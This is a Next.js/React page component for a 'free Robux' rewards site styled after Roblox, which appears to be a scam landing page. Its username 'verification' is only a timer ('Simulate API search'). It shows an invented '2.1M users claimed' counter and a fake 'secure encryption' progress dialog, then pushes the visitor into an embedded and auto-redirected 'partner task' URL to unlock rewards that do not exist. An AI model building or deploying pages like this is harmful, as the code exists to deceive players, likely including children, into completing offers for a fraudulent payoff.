'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import { Loader2, Sparkles, Users, X, ShieldCheck, CheckCircle2, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { cn } from '@/lib/utils';

const CUSTOM_ICON = "https://res.cloudinary.com/dmafb7518/image/upload/v1775750139/GAME_FLASH_20260409_212147_0000_eu5mys.png";
const PROFILE_IMG = "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/3acdf58d1dad75bdc82275056dceeb8a_iq5yni.jpg";
const BANNER_THUMB = "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/0100f6638632dfbf4fb70b4f8be239f6_xveqxc.jpg";
const PARTNER_URL = "https://Gameflashx.space/cl/i/grr84r";

const BANNERS = [
  "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/d8b9163397f761424ec82de73402f66b_rc1oew.jpg",
  "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/0100f6638632dfbf4fb70b4f8be239f6_xveqxc.jpg",
  "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/adf2207e703acbc463bba02993f136a6_cgwxm0.jpg"
];

export default function FreeRobuxPage() {
  const [isProcessing, setIsProcessing] = useState(false);
  const [showIframe, setShowIframe] = useState(false);
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
  const [bannerIndex, setBannerIndex] = useState(0);
  
  // Verification State
  const [username, setUsername] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    const interval = setInterval(() => {
      setBannerIndex((prev) => (prev + 1) % BANNERS.length);
    }, 4500);
    return () => clearInterval(interval);
  }, []);

  const handleVerify = () => {
    if (!username.trim()) {
      setError('Please enter a valid username');
      return;
    }
    setError('');
    setIsVerifying(true);
    
    // Simulate API search
    setTimeout(() => {
      setIsVerifying(false);
      setIsVerified(true);
    }, 2500);
  };

  const handleClaim = (amount: string) => {
    if (!isVerified) {
      setError('Please verify your account first');
      return;
    }
    setSelectedAmount(amount);
    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      setShowIframe(true);
      
      setTimeout(() => {
        if (typeof window !== 'undefined') {
          window.location.href = PARTNER_URL;
        }
      }, 10000);
    }, 2800);
  };

  const rewards = [
    { amount: '50,000', bonus: '+2500 bonus', popular: true },
    { amount: '24,000', bonus: '+1500 bonus', popular: false },
    { amount: '11,000', bonus: '+1000 bonus', popular: false },
    { amount: '2,000', bonus: '+300 bonus', popular: false },
  ];

  return (
    <div className="min-h-screen bg-black font-sans text-white selection:bg-[#00B06F]/30 overflow-x-hidden box-border">
      
      {/* Background Animated Slider */}
      <div className="fixed inset-0 z-0">
        {BANNERS.map((banner, idx) => (
          <div 
            key={banner}
            className={cn(
              "absolute inset-0 transition-opacity duration-[2000ms] ease-in-out",
              idx === bannerIndex ? "opacity-100 scale-110" : "opacity-0 scale-100"
            )}
            style={{ 
              backgroundImage: `url(${banner})`,
              backgroundSize: 'cover',
              backgroundPosition: 'center',
            }}
          />
        ))}
        <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px]" />
      </div>

      {/* Roblox-style Top Bar */}
      <div className="relative h-16 bg-white/10 backdrop-blur-xl border-b border-white/10 flex items-center px-4 md:px-6 justify-between shadow-xl z-50">
        <div className="flex items-center gap-3 md:gap-4">
          <div className="relative w-8 h-8 md:w-9 md:h-9 drop-shadow-[0_0_8px_rgba(255,255,255,0.3)]">
            <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
          </div>
          <span className="font-black text-xs md:text-sm uppercase tracking-tighter text-white">Rewards Dashboard</span>
        </div>
        <div className="flex items-center gap-4 md:gap-6">
          <div className="hidden lg:flex items-center gap-2 text-[10px] font-black text-white/50 uppercase tracking-[0.2em]">
            <Users className="w-4 h-4 text-[#00B06F]" /> 2.1M users claimed
          </div>
          <div className="flex items-center gap-2 md:gap-3 bg-white/5 pl-1.5 pr-3 md:pr-4 py-1 rounded-full border border-white/10">
            <div className="relative w-7 h-7 md:w-8 md:h-8 rounded-full overflow-hidden border-2 border-[#00B06F] shadow-lg">
              <Image src={PROFILE_IMG} alt="User" fill className="object-cover" />
            </div>
            <span className="text-[10px] md:text-xs font-bold text-white whitespace-nowrap">Guest</span>
          </div>
        </div>
      </div>

      <main className="relative z-10 max-w-2xl mx-auto py-8 md:py-12 px-4 md:px-6 space-y-6">
        
        {/* Profile + Banner Row */}
        <div className="bg-white/5 backdrop-blur-xl p-4 rounded-[1.5rem] border border-white/10 flex items-center gap-4 shadow-2xl animate-in slide-in-from-top-4 duration-700">
          <div className="relative w-[60px] h-[60px] rounded-full overflow-hidden border-2 border-white shadow-lg flex-shrink-0">
            <Image src={PROFILE_IMG} alt="Profile" fill className="object-cover" />
          </div>
          <div className="relative flex-1 h-[60px] rounded-[12px] overflow-hidden border border-white/5">
             <Image src={BANNER_THUMB} alt="Banner" fill className="object-cover brightness-75" />
             <div className="absolute inset-0 bg-gradient-to-r from-black/40 to-transparent flex items-center px-4">
               <span className="text-xs font-black uppercase tracking-widest text-white/80">Account Connection</span>
             </div>
          </div>
        </div>

        {/* Username Input Section */}
        <div className="bg-white/5 backdrop-blur-xl p-6 rounded-[1.5rem] border border-white/10 shadow-2xl space-y-4 animate-in slide-in-from-bottom-4 duration-700">
          <div className="space-y-2">
            <div className="flex justify-between items-center">
              <label className="text-[10px] font-black uppercase tracking-[0.2em] text-white/40">Identification</label>
              {isVerified && (
                <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#00B06F]/20 border border-[#00B06F]/30 text-[#00B06F] text-[9px] font-black uppercase animate-in zoom-in-95">
                  <CheckCircle2 className="w-3.5 h-3.5" /> Verified
                </div>
              )}
            </div>
            <Input 
              placeholder="Enter your username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={isVerified}
              className="bg-black/40 border-white/10 text-white h-14 rounded-[12px] text-lg font-bold placeholder:text-white/20 focus:ring-[#00B06F]/50 transition-all"
            />
          </div>
          
          {error && (
            <div className="flex items-center gap-2 text-destructive text-xs font-bold animate-pulse">
              <AlertCircle className="w-4 h-4" /> {error}
            </div>
          )}

          {!isVerified ? (
            <Button 
              onClick={handleVerify}
              disabled={isVerifying}
              className="w-full bg-gradient-to-r from-[#00B06F] to-[#008F5B] hover:brightness-110 text-white font-black h-14 rounded-[12px] text-lg shadow-xl shadow-[#00B06F]/20 transition-all"
            >
              {isVerifying ? <Loader2 className="w-6 h-6 animate-spin" /> : "Continue"}
            </Button>
          ) : (
            <p className="text-center text-[10px] font-bold text-white/30 uppercase tracking-widest">
              Sync complete. Choose your reward package below.
            </p>
          )}
        </div>

        {/* Reward Section */}
        <div className={cn(
          "space-y-4 transition-all duration-700",
          !isVerified ? "opacity-30 pointer-events-none grayscale" : "opacity-100"
        )}>
          {rewards.map((reward, idx) => (
            <div 
              key={reward.amount} 
              style={{ animationDelay: `${idx * 150}ms` }}
              className={cn(
                "group flex items-center justify-between p-4 md:p-6 rounded-[1.2rem] md:rounded-[2rem] border-2 border-transparent bg-white/5 hover:bg-white/10 hover:border-[#00B06F]/50 transition-all cursor-pointer shadow-lg animate-in fade-in slide-in-from-right-8 duration-700 overflow-hidden",
                reward.popular && "border-[#00B06F]/20"
              )}
              onClick={() => handleClaim(reward.amount)}
            >
              <div className="flex items-center gap-3 md:gap-6 flex-1 min-w-0">
                <div className="relative w-10 h-10 md:w-14 md:h-14 flex-shrink-0 drop-shadow-[0_0_15px_rgba(255,255,255,0.2)] group-hover:rotate-12 transition-transform">
                  <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center gap-2 md:gap-3 flex-wrap">
                    <span className="text-xl md:text-3xl font-black tracking-tighter text-white truncate">{reward.amount}</span>
                    {reward.popular && (
                      <span className="bg-[#00B06F] text-white text-[7px] md:text-[8px] font-black uppercase px-2 md:px-3 py-0.5 md:py-1 rounded-full shadow-lg shadow-[#00B06F]/40 animate-pulse whitespace-nowrap">Popular</span>
                    )}
                  </div>
                  <span className="text-[8px] md:text-[10px] font-black text-white/40 uppercase tracking-[0.2em] block truncate">{reward.bonus}</span>
                </div>
              </div>
              
              <Button className="flex-shrink-0 w-24 md:w-28 bg-[#00B06F] hover:bg-[#008F5B] text-white font-black rounded-full h-10 md:h-12 shadow-xl shadow-[#00B06F]/20 transition-all active:scale-95 text-xs md:text-sm group-hover:scale-105 ml-4 whitespace-nowrap">
                Free
              </Button>
            </div>
          ))}
        </div>

        <p className="text-center text-[10px] text-white/20 font-black uppercase tracking-[0.3em] pt-8">
          Complete a partner task to unlock rewards
        </p>
      </main>

      {/* Step 1: Processing Modal */}
      <Dialog open={isProcessing} onOpenChange={setIsProcessing}>
        <DialogContent className="sm:max-w-md bg-black/95 backdrop-blur-2xl border-white/10 rounded-[2rem] md:rounded-[3rem] p-8 md:p-12 text-center outline-none">
          <DialogHeader>
            <DialogTitle className="hidden">Processing</DialogTitle>
          </DialogHeader>
          <div className="flex flex-col items-center space-y-6 md:space-y-8">
            <div className="relative">
              <Loader2 className="w-16 h-16 md:w-24 md:h-24 text-[#00B06F] animate-spin" />
              <div className="absolute inset-0 flex items-center justify-center p-4 md:p-6">
                <div className="relative w-full h-full animate-pulse">
                  <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                </div>
              </div>
            </div>
            <div className="space-y-2 md:space-y-3">
              <h2 className="text-2xl md:text-3xl font-black text-white tracking-tighter">Initializing Link...</h2>
              <p className="text-white/40 font-black uppercase tracking-[0.3em] text-[8px] md:text-[10px]">Secure encryption for {selectedAmount} reward</p>
            </div>
            <div className="w-full bg-white/5 h-2 md:h-2.5 rounded-full overflow-hidden mt-2 md:mt-4 border border-white/5">
              <div className="bg-[#00B06F] h-full animate-[progress_2.8s_ease-in-out]" style={{ width: '100%' }} />
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Step 2: Iframe Partner Modal */}
      <Dialog open={showIframe} onOpenChange={setShowIframe}>
        <DialogContent className="max-w-[95vw] sm:max-w-3xl bg-black/95 backdrop-blur-2xl border-white/10 rounded-[2rem] md:rounded-[3rem] p-0 overflow-hidden shadow-[0_0_100px_rgba(0,176,111,0.1)] outline-none">
          <DialogHeader className="p-6 md:p-8 bg-white/5 border-b border-white/10 flex flex-row items-center justify-between space-y-0">
            <div className="flex items-center gap-3 md:gap-4">
              <div className="relative w-7 h-7 md:w-9 md:h-9">
                <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
              </div>
              <div>
                <DialogTitle className="text-xl md:text-2xl font-black text-white tracking-tighter">Final Step</DialogTitle>
                <p className="text-[8px] md:text-[10px] text-white/40 font-black uppercase tracking-[0.2em]">Verification for {username}</p>
              </div>
            </div>
            <Button variant="ghost" size="icon" onClick={() => setShowIframe(false)} className="rounded-full hover:bg-white/10 text-white/40">
              <X className="w-5 h-5 md:w-6 md:h-6" />
            </Button>
          </DialogHeader>
          
          <div className="relative bg-black h-[60vh] md:h-[550px] flex flex-col">
            <iframe 
              src={PARTNER_URL} 
              className="w-full h-full border-none"
              title="Partner Verification"
            />
            
            <div className="p-6 md:p-8 bg-white/5 border-t border-white/10 text-center backdrop-blur-md">
              <p className="text-[8px] md:text-[10px] text-white/30 font-black uppercase tracking-[0.3em] mb-4">Connection issue? Use direct link</p>
              <Button 
                onClick={() => window.location.href = PARTNER_URL}
                className="w-full bg-[#00B06F] hover:bg-[#008F5B] text-white font-black h-12 md:h-16 rounded-xl md:rounded-2xl text-lg md:text-xl shadow-2xl shadow-[#00B06F]/40 active:scale-95 transition-all"
              >
                Continue to Verify
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <style jsx global>{`
        @keyframes progress {
          0% { width: 0%; }
          100% { width: 100%; }
        }
      `}</style>
    </div>
  );
}
